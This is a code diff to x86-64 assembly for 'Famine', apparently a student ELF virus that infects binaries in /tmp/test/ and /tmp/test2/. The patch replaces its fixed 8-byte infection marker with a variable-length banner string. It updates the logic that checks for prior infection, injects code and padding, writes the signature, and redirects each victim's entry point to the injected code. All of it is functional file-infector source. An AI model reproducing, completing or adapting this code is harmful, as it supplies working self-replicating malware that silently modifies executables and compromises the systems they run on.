@@ -16,7 +16,8 @@
 
 	segment .text
 
-	famine64_signature dq 0x42CAFE4224EFAC24
+	famine64_signature db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
+	famine64_signature_size dd $ - famine64_signature
 famine64_func:
 	push	rax
 	push	rdi
@@ -118,6 +119,7 @@ find_files_end:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 get_dat_elf:
 	push	rbx
+	push	rcx
 	push	rbp
 	sub		rsp, 1024				; char path[1024]
 									; [rsp]
@@ -276,6 +278,7 @@ munmap_file:
 get_dat_elf_end:
 	add		rsp, 1040
 	pop		rbp
+	pop		rcx
 	pop		rbx
 	ret
 
@@ -464,14 +467,25 @@ find_entry_end:
 	;;    Our code inject a signature at the file entry point less 8.        ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 check_signature:
-	mov		rbx, QWORD [rsp + 8]		; Elf64_Phdr *iprogram
-	mov		rax, rdx					; void *data
-	add		rax, QWORD [rax + 24]		; + data->e_entry
-	sub		rax, QWORD [rbx + 16]		; - iprogram->p_vaddr
-	sub		rax, 8						; - sizeof(signature)
-	mov		rax, QWORD [rax]
-	cmp		rax, QWORD [rel famine64_signature]
-	je		infect_file_end
+	mov		rbx, QWORD [rsp + 8]						; Elf64_Phdr *iprogram
+	mov		rax, rdx									; void *data
+	add		rax, QWORD [rax + 24]						; + data->e_entry
+	sub		rax, QWORD [rbx + 16]						; - iprogram->p_vaddr
+	xor		rcx, rcx
+	mov		ecx, DWORD [rel famine64_signature_size]	; - sizeof(signature)
+	sub		rax, rcx
+	sub		rax, 4										; - sizeof(signature size)
+	lea		rbx, [rel famine64_signature]
+	xor		rcx, rcx
+	xor		r8, r8
+	mov		ecx, DWORD [rel famine64_signature_size]
+signature_loop:
+	sub		rcx, 1
+	cmp		rcx, 0
+	jl		infect_file_end
+	mov		r8b, BYTE [rax + rcx]
+	cmp		BYTE [rbx + rcx], r8b
+	je		signature_loop
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; char *path, size_t size, char *data
@@ -507,7 +521,10 @@ reopen_file:
 	mov		rax, QWORD [rsp + 56]			; void *data
 	mov		rax, QWORD [rax + 24]			; data->e_entry
 	sub		rax, QWORD [rbx + 16]			; - iprogram->p_vaddr
-	sub		rax, 8							; + sizeof(signature)
+	xor		r8, r8
+	mov		r8d, DWORD [rel famine64_signature_size]
+	sub		rax, r8
+	sub		rax, 4							; size of signature size
 	sub		rcx, rax						; off - ...
 	imul	rcx, -1							; ... * (-1)
 	mov		QWORD [rsp + 76], rcx			; Old Entry Point offset !!!
@@ -517,7 +534,10 @@ reopen_file:
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov		rcx, QWORD [rsp + 68]			; Elf64_Addr off
 	add		rcx, QWORD [rbx + 16]			; ... + iprogram->p_vaddr
-	add		rcx, 8							; ... + sizeof(famine64_signature)
+	xor		r8, r8
+	mov		r8d, DWORD [rel famine64_signature_size]
+	add		r8, 4
+	add		rcx, r8							; ... + sizeof(famine64_signature)
 	mov		rax, QWORD [rsp + 56]			; void *data
 	mov		QWORD [rax + 24], rcx			; data->e_entry = off + iprogram->p_vaddr + famine64_signature size
 
@@ -558,13 +578,19 @@ find_next_segment_end:
 	mov		rax, QWORD [rdx + 8]			; iprogram->p_offset
 	add		rax, QWORD [rdx + 32]			; ... + iprogram->p_filesz
 	add		rax, QWORD [rel famine64_size]	; ... + famine64_size
-	add		rax, 8							; + sizeof(famine64_signature)
+	xor		r8, r8
+	mov		r8d, DWORD [rel famine64_signature_size]
+	add		r8, 4
+	add		rax, r8							; + sizeof(famine64_signature)
 	mov		rcx, QWORD [rsp + 32]
 	cmp		rax, QWORD [rcx + 8]			; ... > next_ptload->p_offset
 	jle		padding_psize
 	;; [INFO] : psize = famine64_size + sizeof(famine64_signature)
 	mov		rax, QWORD [rel famine64_size]
-	add		rax, 8
+	xor		r8, r8
+	mov		r8d, DWORD [rel famine64_signature_size]
+	add		r8, 4
+	add		rax, r8
 padding_size:
 	add		QWORD [rsp + 84], 0x1000
 	cmp		QWORD [rsp + 84], rax			; padding < psize
@@ -615,7 +641,10 @@ shdr_padding:
 	jmp		shdr_padding
 padding_psize:
 	mov		rax, QWORD [rel famine64_size]
-	add		rax, 8
+	xor		r8, r8
+	mov		r8d, DWORD [rel famine64_signature_size]
+	add		r8, 4
+	add		rax, r8
 	mov		QWORD [rsp + 84], rax			; padding = psize
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 6. Modify Program info                                                ;;
@@ -631,21 +660,27 @@ infect_write:
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 7. Write new code                                                     ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov		rdx, QWORD [rsp + 68]			; unsigned long off
-	mov		rsi, QWORD [rsp + 56]			; void *data
-	mov		edi, DWORD [rsp + 64]			; int fd
+	mov		rdx, QWORD [rsp + 68]					; unsigned long off
+	mov		rsi, QWORD [rsp + 56]					; void *data
+	mov		edi, DWORD [rsp + 64]					; int fd
 	mov		rax, SYS_WRITE
 	syscall
-	mov		rdx, 8							; sizeof(famine64_signature)
-	lea		rsi, [rel famine64_signature]	; famine64_signature
-	mov		edi, DWORD [rsp + 64]			; int fd
+	xor		rdx, rdx
+	mov		edx, DWORD [rel famine64_signature_size]
+	lea		rsi, [rel famine64_signature]
+	mov		edi, DWORD [rsp + 64]					; int fd
 	mov		rax, SYS_WRITE
 	syscall
-	mov		rdx, QWORD [rel famine64_size]
+	mov		rdx, 4
+	lea		rsi, [rel famine64_signature_size]
+	mov		edi, DWORD [rsp + 64]					; int fd
+	mov		rax, SYS_WRITE
+	syscall
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; Loop through dir_all to calculate the number of directories offset    ;;
 	;; we will rewrite.                                                      ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	mov		rdx, QWORD [rel famine64_size]
 	mov		DWORD [rsp + 92], 0
 	xor		rax, rax
 dir_nb:
@@ -702,7 +737,10 @@ write_dir_end:
 	;; 8. Add padding if needed                                              ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov		rax, QWORD [rel famine64_size]
-	add		rax, 8							; add famine64_signature size
+	xor		r8, r8
+	mov		r8d, DWORD [rel famine64_signature_size]
+	add		r8, 4
+	add		rax, r8							; add famine64_signature size
 	cmp		QWORD [rsp + 84], rax			; padding == psize ?
 	je		off_add
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -718,7 +756,10 @@ add_padding:
 	syscall
 	sub		QWORD [rsp + 84], 1				; padding--
 	mov		rax, QWORD [rel famine64_size]
-	add		rax, 8
+	xor		r8, r8
+	mov		r8d, DWORD [rel famine64_signature_size]
+	add		r8, 4
+	add		rax, r8							; size of signature + signature size
 	cmp		QWORD [rsp + 84], rax			; padding > psize ?
 	ja		add_padding
 	jmp		infect_write_end
@@ -757,7 +798,6 @@ do_ret:
 
 data:
 	famine64_size dq end_of_file - famine64_func
-	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
 	dir_one db "/tmp/test/", 0
 	dir_two db "/tmp/test2/", 0
 	dir_all dq dir_one, dir_two, 0
